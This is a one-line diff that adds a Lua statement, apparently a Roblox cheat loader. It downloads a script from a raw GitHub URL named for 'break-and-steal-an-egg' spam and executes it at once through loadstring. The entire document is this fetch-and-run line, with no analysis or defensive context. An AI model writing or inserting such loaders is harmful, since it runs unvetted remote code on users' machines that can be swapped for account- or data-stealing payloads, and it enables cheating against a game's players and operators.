@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/break-and-steal-an-egg-spam7-eqlwe1kjhit1g5.lua"))()
